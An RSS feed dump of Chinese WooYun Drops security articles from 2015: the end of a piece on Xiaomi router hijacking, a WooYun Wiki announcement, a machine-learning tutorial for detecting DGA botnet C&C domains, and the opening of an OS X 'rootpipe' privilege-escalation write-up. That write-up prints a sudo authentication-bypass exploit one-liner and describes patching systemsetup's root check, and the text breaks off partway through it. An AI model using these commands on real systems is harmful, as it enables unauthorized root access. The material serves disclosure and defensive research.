窃取至小米服务器，已经可以定性为后门程序。然而开发版意味着该功能只是技术尝试，并未给普通用户造成实际影响，因此虽然性质恶劣但是目前影响并不大。我认为小米有意将木马程序推送给全国用户，暂时先在开发版里试一下水，如果不被发现就继续这么干下去了，现在被发现之后轻描淡写称开发版是逗你们玩儿的。想起之前大量discuz论坛被黑的事件，域名被劫持加上恶意代码，导致使用discuz论坛的站长在登录后台之后执行了恶意代码自己论坛被黑：&lt;a href=&quot;http://tech.163.com/09/0108/15/4V55DUGA000915BF.html&quot; data-editable=&quot;true&quot; data-title=&quot;Discuz!服务器域名被劫持 用户网站遭黑客攻击&quot;&gt;Discuz!服务器域名被劫持 用户网站遭黑客攻击&lt;/a&gt;&lt;/p&gt;&lt;p&gt;from:&lt;a href=&quot;http://drops.wooyun.org/tips/6820&quot; data-editable=&quot;true&quot; data-title=&quot;小米路由器劫持用户浏览器事件回顾&quot;&gt;小米路由器劫持用户浏览器事件回顾&lt;/a&gt;&lt;/p&gt;&lt;p&gt;============================================================&lt;/p&gt;&lt;p&gt;&lt;b&gt;乌云知识库征集技术paper，包括并不仅限于安全方面，如果你有好的技术沉淀想要分享，欢迎前来投稿&lt;a href=&quot;http://drops.wooyun.org/newsend&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;投稿 | WooYun知识库&quot;&gt;http://drops.wooyun.org/newsend&lt;/a&gt; 也可直接发送原稿到drops@wooyun.org&lt;/b&gt;&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2015-06-29-20091644</guid>
<pubDate>Mon, 29 Jun 2015 00:00:00 +0800</pubDate>
</item>
<item>
<title>乌云 WiKi 正式上线</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2015-06-08-20062012.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/20062012&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这段话也许有些长，所以感谢您的阅读。&lt;/p&gt;&lt;p&gt;从一开始乌云就不断致力于促进安全行业的发展，传播安全知识。&lt;/p&gt;&lt;p&gt;虽然我们知道我们最终可能只会影响一小部分人对于已定型的世界观的动摇，到对其再思考。&lt;/p&gt;&lt;p&gt;但是我们相信，从一个人到另外一个人，从一个群体到另外一个群体的传播，最后我们可以影响的也许比想象中要多的多。&lt;/p&gt;&lt;p&gt;对于事实的不断传播也许能够不断地在人的内心中埋下一颗微小的种子，但并不意味着对于信息的传播本身完全不存在任何的缺陷。&lt;/p&gt;&lt;p&gt;信息在人与人之间的传播过程中，信息会不断被丢失，被修正，被扭曲。&lt;/p&gt;&lt;p&gt;正因为如此，我们选择去建立了乌云百科，它并不是一个只面向安全研究者，或者企业的工具，我们希望他能够面向每一个人。&lt;/p&gt;&lt;p&gt;对于词条，我们希望他不再是单一的充斥着各种浮夸的技术名词，而是囊括了对于事实准确并且简短的概述。&lt;/p&gt;&lt;p&gt;对于事实的简单明了的科普，对于事实本身细节精确的阐述，还有专业的研究者整理的参考链接。&lt;/p&gt;&lt;p&gt;欢迎白帽子提交自己对于事实，对于某件事物的看法，或者对于某个词条的修改，疑惑。&lt;/p&gt;&lt;p&gt;乌云百科虽然不会永远正确，但是我们会努力让其接近正确的点。&lt;/p&gt;&lt;p&gt;感谢阅读，感谢一直以来的支持。&lt;/p&gt;&lt;br&gt;&lt;p&gt;目前由于管理精力有限，目前只有拥有乌云账号的人可以提交词条。&lt;br&gt;&lt;/p&gt;&lt;p&gt;各位有任何意见，或者想要看的词条可以在下面留言。&lt;/p&gt;&lt;p&gt;访问地址：&lt;a href=&quot;http://wiki.wooyun.org/&quot; data-editable=&quot;true&quot; data-title=&quot;WooYun WiKi [WooYun WiKi]&quot; class=&quot;&quot;&gt;http://wiki.wooyun.org/&lt;/a&gt;&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2015-06-08-20062012</guid>
<pubDate>Mon, 08 Jun 2015 00:00:00 +0800</pubDate>
</item>
<item>
<title>用机器学习识别随机生成的C&amp;C域名</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2015-05-26-20045198.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/20045198&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;author : phunter&lt;/p&gt;&lt;h1&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文用识别由域名生成算法Domain Generation Algorithm: DGA生成的C&amp;amp;C域名作为例子，目的是给白帽安全专家们介绍一下机器学习在安全领域的应用，演示一下机器学习模型的一般流程。机器的力量可以用来辅助白帽专家们更有效率的工作。&lt;/p&gt;&lt;p&gt;本文用到的演示数据集和python演示代码请参见 &lt;a href=&quot;https://github.com/phunterlau/dga_classifier&quot; data-editable=&quot;true&quot; data-title=&quot;phunterlau/dga_classifier · GitHub&quot;&gt;phunterlau/dga_classifier · GitHub&lt;/a&gt; 关于编码和行文风格过于仓促的问题，请不要在意这些细节，如果有相关问题可以微博上&lt;a href=&quot;http://weibo.com/phunterlau&quot;&gt;@phunter_lau&lt;/a&gt;，大家互相交流进步。&lt;/p&gt;&lt;h1&gt;0x01 为什么要机器学习？&lt;/h1&gt;&lt;p&gt;DGA生成C&amp;amp;C域名的办法常见于一类botnet，比如conficker，zeus之类，他们的方法是用一个私有的随机字符串生成算法，按照日期或者其他随机种子（比如twitter头条），每天生成一些随机字符串域名然后用其中的一些当作C&amp;amp;C域名。在他们的bot malware里面也按照同样的算法尝试生成这些随机域名然后碰撞得到当天可用的C&amp;amp;C域名。&lt;/p&gt;&lt;p&gt;多数关于C&amp;amp;C域名的研究在于部分特性比如域名的快速转换(fast flux)或者是分析malware的源码找出随机算法（或者像zeus这样源码泄漏）。而对于一个白帽子专家来说，可能把域名给他看一下他也就能按照经验猜出来大概，比如我们可以猜猜下面哪些域名可能是C&amp;amp;C域名：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;fppgcheznrh.org
fryjntzfvti.biz
fsdztywx.info
yahoo.com.
baidu.com.
dmiszlet.cn
dmgbcqedaf.cn
google.com.
facebook.com.
frewrdbm.net
&lt;/code&gt;&lt;p&gt;上面的例子混合了常见合法域名和confickr生成的一些C&amp;amp;C域名，白帽可以用多年人生的经验轻松分辨，但大量随机域名由机器生成，我们不能雇佣十万个白帽专家挨个检测，就好比观众朋友们可能看完上面10个域名就已经眼花了。&lt;/p&gt;&lt;p&gt;机器可以利用人类的经验来完成这样的重复性工作，比如分类（Classification）任务就是判别一个域名是不是C&amp;amp;C，判别一个狗咬不咬人，这些Yes or No的任务都是分类任务。分类任务归于是机器学习里面的监督学习(supervised learning)，基本套路就是：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;提供训练数据集&lt;/li&gt;&lt;li&gt;把人类的经验表示为特征（feature）把数据集转换成特征向量(feature vector)&lt;/li&gt;&lt;li&gt;利用这些数据集和他们的特征向量训练合适的分类器（Classifier，不用担心，这一步有无数开源工具）&lt;/li&gt;&lt;li&gt;评价分类效果，比如精度、召回率等等，并交叉检验分类效果 (Cross-validation)。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;机器学习并没有什么神秘的技术，它本质上是用多个变量进行综合决策，机器在这多个变量的约束下用数值计算方法找出近似最优解。比如在这个例子里，白帽专家的经验就是“这些域名看起来像是随机的”。如果把“看起来”表示称机器能计算的多个变量的特征，机器就能帮助白帽专家判别哪些域名可能是C&amp;amp;C域名。&lt;/p&gt;&lt;h1&gt;0x02 数据收集&lt;/h1&gt;&lt;p&gt;分类的任务需要告诉机器他用来学习的正例(positive samples)和反例(negative samples)，在这里正例就是C&amp;amp;C域名，反例就是正常的合法域名。&lt;/p&gt;&lt;p&gt;正例和反例的涵盖范围和具体问题有关，具体到本文的例子，我选择Conficker（ABC三种混合）当作正例，Alexa前10万当作反例。Conficker的算法早在多年前公开，这里纯粹是演示目的并没有产品化的意义，对于实际的工作如果想让模型有更广泛的适用性，需要在训练数据集里加入其他种类的C&amp;amp;C域名以及其他合法域名，然后用类似的办法训练得到一个更广泛适用的模型。&lt;/p&gt;&lt;p&gt;整理好的数据集在：conficker_alexa_training.txt 格式是第一列为域名（字符串），第二列为它的标记（0代表反例，1代表正例）&lt;/p&gt;&lt;h1&gt;0x03 特征工程&lt;/h1&gt;&lt;p&gt;这几乎是整个文章最有值得读的部分。如果能把人类的经验用数量化表达给机器，机器就能学习到人类的经验，而特征(feature)就是人类经验的数量化。特征工程是个反复循环的过程，一开始我们找到基线特征，用分类算法计算并评价结果，如果结果不能达到预期，再回头来加入新的特征帮助更好的分类。&lt;/p&gt;&lt;h3&gt;基本特征：随机性和熵&lt;/h3&gt;&lt;p&gt;我们可以想一下，具体为什么C&amp;amp;C域名看起来和别的合法域名比如google.com不一样呢？因为它看起来随机，所以第一个特征就是找一个数量来描述它的随机性。我们用Shannon熵&lt;a href=&quot;http://en.wikipedia.org/wiki/Entropy_(information_theory)&quot; data-editable=&quot;true&quot; data-title=&quot;wikipedia.org 的页面&quot; class=&quot;&quot;&gt;http://en.wikipedia.org/wiki/Entropy_(information_theory)&lt;/a&gt; 表达域名里各个字符出现的随机性，因为越是随机熵值越高：&lt;/p&gt;&lt;br&gt;&lt;code lang=&quot;python&quot;&gt;from collections import Counter
count = Counter(i for i in main_domain).most_common()
entropy = -sum(j/f_len*(math.log(j/f_len)) for i,j in count)#shannon entropy&lt;/code&gt;&lt;p&gt;Shannon熵可以很好的判别fryjntzfvti.biz和google.com/qq.com之间的区别，因为前者用了很多不重复字母而qq.com的重复字幕比较多。但是很多合法域名的熵值和C&amp;amp;C域名之间的并非是绝对差距，比如baidu.com也是五个不重复的字母，这单个特征不足以最终决策，我们还一些其他高级的特征。&lt;/p&gt;&lt;h3&gt;高级特征：还有什么能表达随机性呢&lt;/h3&gt;&lt;p&gt;&lt;em&gt;合法域名一般比较好念出来，C&amp;amp;C域名不好念&lt;/em&gt;&lt;/p&gt;&lt;p&gt;思考一下合法域名和C&amp;amp;C域名的目的，就可以想到：合法域名为了让人类记住会选一些好念（pronounceable）的域名，比如 google yahoo baidu等等有元音字母之类好念的，而C&amp;amp;C域名为了随机性就不太好念，比如fryjntzfvti.biz。域名里元音字母占的比重可以是个很好的特征。&lt;/p&gt;&lt;p&gt;“好念“这个概念也可以有另外一个高级一些的特征，叫做gibberish detection，判断一个字符串是不是能用人类的语言念出来，比如google就不是一个英文单词但是朗朗上口。这背后是一个基于马尔可夫链的模型，具体细节可以参见 &lt;a href=&quot;https://github.com/rrenaud/Gibberish-Detector&quot; data-editable=&quot;true&quot; data-title=&quot;rrenaud/Gibberish-Detector · GitHub&quot;&gt;rrenaud/Gibberish-Detector · GitHub&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;连续 vs 分散&lt;/em&gt;&lt;/p&gt;&lt;p&gt;通过进一步观察我们可以发现，C&amp;amp;C域名的随机性也表现在连续出现的字母和数字上。一般随机生成的域名都不会出现大段连续的数字或者连续出现相同的字母。同时因为英文字母分布里辅音字母远多于元音字母，C&amp;amp;C更可能连续反复出现辅音字母，而合法域名为了好念多是元音辅音交替。这些都是不容易想到但是容易计算的特征，代码并不复杂。&lt;/p&gt;&lt;p&gt;&lt;em&gt;还有什么？n-gram 的平均排名！&lt;/em&gt;&lt;/p&gt;&lt;p&gt;这是我个人认为比较巧妙的想法。&lt;/p&gt;&lt;p&gt;对于字符串文本的机器学习，n-gram （unigram（单字）bigram（相邻双字）trigram（相邻三字））常常能提供重要的特征。举例来说，fryjntzfvti.biz的域名的bigram分解是以下12个：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;^f,fr,ry,yj,jn,nt,tz,zf,fv,vt,ti,i$
&lt;/code&gt;&lt;p&gt;这里^和$代表字符串的开头和结尾。观众朋友可以自行计算trigram当作练习。bigram/trigram本身出现的频率也可以当作特征，但是对这个问题来说，bigram本身可能有 (26+2)^2=784种组合，trigram就有21952种组合，特征向量的长度太长而我们的数据约有25万组，如果把他们本身当作特征，模型训练的速度很慢。（比较熟悉机器学习的观众朋友可能会提示用PCA等降维方法，我实际实验表明降维到20维左右效果也不错，在此不当作本文内容，请有兴趣的观众朋友自己实验一下。）&lt;/p&gt;&lt;p&gt;C&amp;amp;C域名的随机算法产生的bigram和trigram比较分散，而合法域名喜欢用比较好念好见的组合。如果把正例反例出现的bigram按照出现频率进行排序会发现，合法域名的bigram在频率排序里的位置比较靠前，而随机C&amp;amp;C域名产生的比较分散的bigram/trigram基本上频率都很低，所以bigram/trigram的平均排名也可以很好的区分C&amp;amp;C和合法域名。&lt;/p&gt;&lt;p&gt;扯一些额外内容。n-gram的分析方法也常用于malware的代码和二进制码的自动分析，比如ASM里面每个指令当作一个gram，指令的组合可能对应于一些可疑行为。靠人工找这些可能可疑行为对应的指令组合十分麻烦，但是机器就适合做这些繁琐的事情啊，只要把所有n-gram扔给机器做分类，最后机器会给出特定组合的权重，就能找到这些对应的指令对了。二进制代码的分析也有类似方法，参见最近Kaggle的malware分类比赛的获胜报告（参考文献&lt;a href=&quot;http://en.wikipedia.org/wiki/Support_vector_machine&quot; data-editable=&quot;true&quot; data-title=&quot;3&quot;&gt;3&lt;/a&gt;）。有白帽专家可能会问，有些可疑指令对可能距离比较远怎么办？这种情况就是skip-gram分析，建议谷歌搜索相关关键词，这里就不多说撑篇幅了。&lt;/p&gt;&lt;p&gt;&lt;em&gt;究竟还能再挖出来什么特征呢？&lt;/em&gt;&lt;/p&gt;&lt;p&gt;特征工程就好像Taylor Swift的胸一样，你只要需要，用力挤努力挤还是有的。如果按照反例Alexa前10万名训练隐含马尔可夫链，计算一下从A_i到A_i+1转换的概率。这个转换概率的分布对于正例有一些区别，也可以用来帮助区分。具体关于马尔可夫链相关知识请参见&lt;a href=&quot;http://en.wikipedia.org/wiki/Markov_chain&quot; data-editable=&quot;true&quot; data-title=&quot;Markov chain&quot;&gt;Markov chain&lt;/a&gt; （解释起来背后的原因篇幅比较大，就只贴一下这个特征的分布图，但是不要害怕，看示例代码里的实现其实很简单，只是计算转移矩阵而已）&lt;/p&gt;&lt;h3&gt;领域特征：安全专家的领域知识&lt;/h3&gt;&lt;p&gt;对于C&amp;amp;C域名，不只是随机性，其他白帽专家才知道的领域知识也会提供重要的特征。&lt;/p&gt;&lt;p&gt;比如域名所在的ccTLD可以当作特征。我们知道多数情况下.com的域名申请又贵又要审核，所以现在很多C&amp;amp;C不会选择.com，反而会选一些审核不严的比如.biz .info .ru .ws以及最近爆发的.xyz之类的ccTLD都是C&amp;amp;C重灾区。中国的白帽专家也可能知道.cn现在申请都得备案，所以C&amp;amp;C也不太可能用.cn的根域名当作C&amp;amp;C。值得提醒的是，这些情况并非100%确定，比如C&amp;amp;C可能找到一个cn域名的下级域名当C&amp;amp;C而主域名已备案，这些需要机器综合考虑其他特征来判断。ccTLD这样的类别特征(categorial feature)在使用的时候需要编码变成 is_biz=0/1, is_ws=0/1这样展开的0/1向量，这个方法叫做OneHotEncoder。实际的模型结果也显示出来.biz .info之类的ccTLD对C&amp;amp;C域名的判断占的重要性比重很大。&lt;/p&gt;&lt;p&gt;还有一些看似比较无聊但是很有价值的知识：比如C&amp;amp;C域名现在越来越长，因为短的域名都被抢光了，所以域名长度也可以是重要的特征。更多这些特征需要安全专家加入自己的领域知识来得到，专家的领域知识在机器学习里的重要程度几乎是第一位的。&lt;/p&gt;&lt;h3&gt;Talk is cheap, show me the code!&lt;/h3&gt;&lt;p&gt;特征工程部分的代码流程如下&lt;/p&gt;&lt;ol&gt;&lt;li&gt;tld_appender.py (解析每个域名的ccTLD)&lt;/li&gt;&lt;li&gt;gram_freq_rank.py （生成bigram/trigram的基准排名）&lt;/li&gt;&lt;li&gt;feat_n_gram_rank_extractor.py （得到bigram/trigram排名）&lt;/li&gt;&lt;li&gt;feat_extractor.py （各个特征计算的函数，需要包含&lt;a href=&quot;https://github.com/rrenaud/Gibberish-Detector&quot; data-editable=&quot;true&quot; data-title=&quot;rrenaud/Gibberish-Detector · GitHub&quot;&gt;rrenaud/Gibberish-Detector · GitHub&lt;/a&gt;）&lt;/li&gt;&lt;li&gt;feat_normalizer.py和feat_vectorizer.py （特征归一化向量化）&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;最后会输出 vectorized_feature_w_ranks_norm.txt的归一化向量化的结果文件。对于25万组数据，这个文件比较大，就没有包含在github代码库里了，请自行生成。&lt;/p&gt;&lt;p&gt;这些是上面谈到的各个特征在在代码里的入口，完整的代码请参见github：&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;code lang=&quot;python&quot;&gt;#in feat_extractor.py
f_len = float(len(main_domain))
count = Counter(i for i in main_domain).most_common()#unigram frequency
entropy = -sum(j/f_len*(math.log(j/f_len)) for i,j in count)#shannon entropy
unigram_rank = np.array([gram_rank_dict[i] if i in gram_rank_dict else 0 for i in main_domain[1:-1]])
bigram_rank = np.array([gram_rank_dict[&#39;&#39;.join(i)] if &#39;&#39;.join(i) in gram_rank_dict else 0 for i in bigrams(main_domain)])#extract the bigram
trigram_rank = np.array([gram_rank_dict[&#39;&#39;.join(i)] if &#39;&#39;.join(i) in gram_rank_dict else 0 for i in trigrams(main_domain)])#extract the bigram
 
#linguistic feature: % of vowels, % of digits, % of repeated letter, % consecutive digits and % non-&#39;aeiou&#39;
vowel_ratio = count_vowels(main_domain)/f_len
digit_ratio = count_digits(main_domain)/f_len
repeat_letter = count_repeat_letter(main_domain)/f_len
consec_digit = consecutive_digits(main_domain)/f_len
consec_consonant = consecutive_consonant(main_domain)/f_len
 
#probability of staying in the markov transition matrix (trained by Alexa)
hmm_prob_ = hmm_prob(hmm_main_domain)&lt;/code&gt;&lt;p&gt;一个技巧是，因为有ccTLD这个离散特征，我们把所有的特征用字典dict存储，然后用scikit-learn的DictVectorizer将特征向量化：&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;code lang=&quot;python&quot;&gt;#in feat_vectorizer.py
from sklearn.feature_extraction import DictVectorizer
vec = DictVectorizer()
measurements = [feat_dict for domain,cla,feat_dict in feat_table]
feature_list = vec.fit_transform(measurements).toarray()&lt;/code&gt;&lt;p&gt;值得再次提醒注意的是，特征工程是个反复的过程，不用在一开始就找到足够多的好的特征。在我的实际实验里，后面的高级特征也花了好几天的时间反复思考得到。&lt;/p&gt;&lt;h1&gt;0x04 模型选择和训练&lt;/h1&gt;&lt;p&gt;判断一个域名是不是C&amp;amp;C域名这样Yes or No任务是分类任务。对于分类任务，常见的模型一般是Logistic Regression啊决策树啊之类的。这里我选择SVM支持向量机作为分类算法，关于SVM的理论知识可以前往 &lt;a href=&quot;http://en.wikipedia.org/wiki/Support_vector_machine&quot; data-editable=&quot;true&quot; data-title=&quot;Support vector machine&quot;&gt;Support vector machine&lt;/a&gt; 阅读了解，而我们用起来它只需要：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;from sklearn.svm import SVC
classifier = SVC(kernel=&#39;linear&#39;)
&lt;/code&gt;&lt;p&gt;就可以创建一个SVM的线性分类算法了，这个算法读入之前特征工程产生的特征并作出预测，就是这么简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;probas_ = classifier.fit(X_train, y_train).predict(X_test)
&lt;/code&gt;&lt;p&gt;机器学习的这些分类算法模型做的工作可以认为是利用每个例子的N个特征向量的权衡考虑得到预测结果。不同的分类算法的权衡考虑方法不一样，但是从总体来看是个多变量的平衡。因为本文重点在于特征工程，而关于模型的训练原理以及背后的数学可以说很多，在此就仅把模型训练当作黑盒处理，有兴趣的观众朋友们可以多多研究scikit-learn关于分类算法的教程 &lt;a href=&quot;http://scikit-learn.org/stable/tutorial/statistical_inference/supervised_learning.html&quot; data-editable=&quot;true&quot; data-title=&quot;Supervised learning: predicting an output variable from high-dimensional observations&quot;&gt;Supervised learning: predicting an output variable from high-dimensional observations&lt;/a&gt;。对于模型参数的选择可以通过交叉验证（Cross validation）来优选最适合的参数，这一点请当作进阶自行阅读。&lt;/p&gt;&lt;p&gt;一些个人的意见就是，各种分类算法的效果其实差不太多，区别主要在于适用情况上，如果发现一种分类算法的结果明显不满意，可能是因为它不适合这个问题（比如朴素贝叶斯就不适合特征相关度高的），也有可能这个算法需要的特征还没被挖掘出来，需要回到特征工程上面再深入挖一些有利于区分正例反例的特征。总的来说，特征工程弄好了就定好了分类效果的上限，模型只是尽力接近这个上限，多花时间在搞特征上最能提高。除非是深度学习这样带特征学习的猛兽，这就是题外话了。&lt;/p&gt;&lt;h1&gt;0x05 评价函数和交叉验证&lt;/h1&gt;&lt;p&gt;为了评价机器的预测效果，我们需要量化的评价函数。对于“判断域名是否为C&amp;amp;C”的问题可以考虑：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;对于真正的C&amp;amp;C域名能抓住多少，多少漏网？(true positive vs false negative用召回率recall衡量)&lt;/li&gt;&lt;li&gt;如果一个域名是合法域名，会不会当作C&amp;amp;C误杀？(true positive vs false positive用精度precision衡量)&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;关于precision（精度）和recall（召回率）的相关介绍，请参见wikipedia&lt;a href=&quot;http://en.wikipedia.org/wiki/Precision_and_recall&quot; data-editable=&quot;true&quot; data-title=&quot;Precision and recall&quot;&gt;Precision and recall&lt;/a&gt; 计算precision和recall的代码很简单：&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;from sklearn.metrics import precision_recall_curve
precision, recall, thresholds = precision_recall_curve(y_truth, probas_)&lt;/code&gt;&lt;p&gt;在训练模型的时候，测试数据对我们并不可见（否则就不叫预测了，就是作弊啊），那么问题就是，只有训练数据我们怎么评价我们的模型的预测效果呢？一个好用的技术叫做交叉验证（Cross-validation），基本方法就是假装看不见一小部分训练数据（一般是1/5），用剩下的4/5数据训练模型，看看这4/5数据训练的模型对那1/5的数据的预测能力，因为那1/5的数据我们知道它里面那些域名是C&amp;amp;C哪些不是，这样就可以计算precision和recall。为了公平起见，一般我们会把数据随机洗牌，然后做多次交叉检验，这叫做K-fold cross validation。&lt;/p&gt;&lt;p&gt;对于每次的交叉检验，我们可以画出precision vs recall的曲线图，从中可以看到precision和recall的相对平衡，比如下图：&lt;/p&gt;&lt;p&gt;我们可以看到，如果要保持0.8左右的recall召回率，precision可以达到90%以上，但是如果要召回率达到100%，那precision只能有15%左右了。&lt;/p&gt;&lt;p&gt;域名的分类效果和域名的长度也有关系，我们可以画出来平均的Accuracy和域名长度的关系图：&lt;/p&gt;&lt;p&gt;正如大家想到的一样，对短的域名分类效果一般，因为短域字符串本身的信息不如长域名丰富。不过现在C&amp;amp;C的域名越来越长，如果只看长于12个字符的C&amp;amp;C域名，预测效果还是很不错的。&lt;/p&gt;&lt;p&gt;值得提醒的是，测试数据的预测误差比交叉检验得到误差不同（一般测试的误差要大得多）。在测试数据上的误差需要深入的了解和调试，这些是进阶内容，请今后自己在实战里摸索，很有挑战性哟。&lt;/p&gt;&lt;h1&gt;0x06 总结&lt;/h1&gt;&lt;p&gt;这篇文章用域名字符串特征判别C&amp;amp;C的任务，简单介绍了一下机器学习在安全领域的一个小小应用，主要为了演示一下一个机器学习任务的基本流程。在机器学习里，特征工程几乎是最重要的部分，在这篇文章里面我们深入挖掘了“看起来像”这个分类特征的若干种可以量化的表达方式，有些特征需要反复思考得到，有些特征需要领域知识。对于输入的一组很好的特征，基本上各种分类器都能有不错的表现，我们用精度和召回率评价模型的分类效果，看看有哪些C&amp;amp;C我们放过了，哪些合法域名我们误杀了，用交叉验证的方式判断模型效果，并根据这些评价来调整模型。更简单一点就是这个套路：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;准备数据集&lt;/li&gt;&lt;li&gt;抽取特征（几乎是最重要的工作）&lt;/li&gt;&lt;li&gt;选取合适的模型（绝大多数情况都有开源的代码）&lt;/li&gt;&lt;li&gt;设计评价函数并交叉验证（设计一个适合自己问题的评价）&lt;/li&gt;&lt;li&gt;对测试数据预测&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;在实际工作里，2-5这几步可能需要反复完善：用基准特征训练模型，用交叉检验搜索选择最优模型参数并评价，如果评价不满意，继续添加新的更好的特征，如果添加特征还不满意，就再继续调整模型参数添加新的特征，挤一挤总是有的嘛。&lt;/p&gt;&lt;p&gt;在安全领域很多方面都可以用机器学习来辅助，比如从日志里挑出可疑行为，在exe文件里找出malware的hook插入点之类的，都遵循上面类似的套路。这篇文章想起到抛砖引玉的作用，给各位白帽专家做参考，看看机器学习在你们的特定专业领域里应用。在我的实际工作里，机器学习的多方面技术都有应用，比如可以用clustering聚类的办法把可能的botnet聚集在一起，用遗传算法反解出散列攻击的随机数生成算法，用深度学习做（此处被公司要求马赛克掉）的一些研究。&lt;/p&gt;&lt;p&gt;提醒一点的是，机器学习的主要目的是简化和辅助而不是取代专家的工作，它可以减轻白帽专家批量处理一些繁复复杂问题的负担，让专家集中精力到更重要的工作上，它的预测判断基于一定的前提条件，预测的结果是0-1之间的概率。对于一个可能C&amp;amp;C域名是杀是放，还是取决于执行最后决策的人类白帽专家。你问我支持不支持机器的预测，我是支持的，但是一切还都要按基本法来，对吧。&lt;/p&gt;&lt;p&gt;安全的工作好比大海捞针，机器学习可能就是帮我们捞针的磁铁，欢迎大家加入机器学习的行列。&lt;/p&gt;&lt;h1&gt;0x07 深入阅读和参考文献&lt;/h1&gt;&lt;p&gt;从域名的“看起来像”这个特征来判断C&amp;amp;C域名的想法受到这片文章的启发&lt;a href=&quot;http://www.sersc.org/journals/IJSIA/vol7_no1_2013/5.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;sersc.org 的页面&quot; class=&quot;&quot;&gt;http://www.sersc.org/journals/IJSIA/vol7_no1_2013/5.pdf&lt;/a&gt;&lt;/p&gt;&lt;p&gt;如果想继续学习一些关于机器学习的知识，建议在Coursera上学习斯坦福的机器学习入门课&lt;a href=&quot;https://www.coursera.org/course/ml&quot;&gt;https://www.coursera.org/course/ml&lt;/a&gt;&lt;/p&gt;&lt;p&gt;机器学习在安全领域有很多应用，比如Kaggle的Malware分类任务，机器可以分析反编译的ASM和原始binary自动判别malware的种类并取得很好的效果，几位获胜者的报告很值得研究一下&lt;a href=&quot;https://www.kaggle.com/c/malware-classification&quot; data-editable=&quot;true&quot; data-title=&quot;Description - Microsoft Malware Classification Challenge (BIG 2015)&quot;&gt;Description - Microsoft Malware Classification Challenge (BIG 2015)&lt;/a&gt;&lt;/p&gt;&lt;p&gt;在Kaggle比赛和本文中用到的机器学习软件包 scikit-learn 的主页在&lt;a href=&quot;http://scikit-learn.org/stable/&quot; data-editable=&quot;true&quot; data-title=&quot;scikit-learn: machine learning in Python&quot;&gt;scikit-learn: machine learning in Python&lt;/a&gt;（已被墙）&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2015-05-26-20045198</guid>
<pubDate>Tue, 26 May 2015 00:00:00 +0800</pubDate>
</item>
<item>
<title>Apple OS X系统中存在可以提升root权限的API后门</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2015-04-10-19999291.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/19999291&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;from:&lt;a href=&quot;https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/&quot; data-editable=&quot;true&quot; data-title=&quot;wordpress.com 的页面&quot;&gt;https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;0x00 摘要&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Apple OS X系统中的Admin框架存在可以提升root权限的API后门，并且已经存在多年（至少是从2011年开始）。我是在2014年的10月发现他可以被用来已任何用户权限提升为root权限，其本意可能是要服务“System Preferences”和systemsetup（命令行工具），但是所有的用户进程可以使用相同的功能。&lt;/p&gt;&lt;p&gt;苹果刚刚发布了OS X 10.10.3解决了此问题，但是OS X 10.9.x以及之前的版本存在此问题，因为苹果决定不对这些版本进行修复了。我们建议所有的用户都升级到10.10.3。&lt;/p&gt;&lt;p&gt;&lt;b&gt;0x01 demo&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我使用的第一个exp是基于CVE-2013-1775的，一个sudo认证绕过bug，这个bug已经在10.8.5（2013年9月）修复了。&lt;/p&gt;&lt;p&gt;exp代码非常的简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ sudo -k;systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00;sudo su&lt;/code&gt;&lt;p&gt;我跟我同事Philip Åkesson聊这个exp代码实际上使用了systemsetup来修改系统时间。我们一起来看了下他修复的细节，原来除了修复了sudo，Apple也同时做了另外一件事情，他们把systemsetup设置为需要root权限，当以非root权限执行systemsetup的时候，下面的信息就会显示（在10.8.5以及之后版本）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ systemsetup
You need administrator access to run this tool... exiting!
&lt;/code&gt;&lt;p&gt;这个消息其实是有点误导的，以为我们实际上是在以管理员权限运行，安装OS X时候创建的用户默认就是admin权限。&lt;/p&gt;&lt;p&gt;总之，上面的消息表明执行该命令需要root权限，通过Hopper反汇编发现了下面的代码&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/300186d0b64c10a950af70ee309262f4_r.jpg&quot; data-rawwidth=&quot;456&quot; data-rawheight=&quot;195&quot;&gt;&lt;p&gt;OK，所以systemsetup二进制文件只是简单的检查了是否是root权限。&lt;/p&gt;&lt;p&gt;修改了一下函数（用setne替代sete）：取得了成功&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ systemsetup
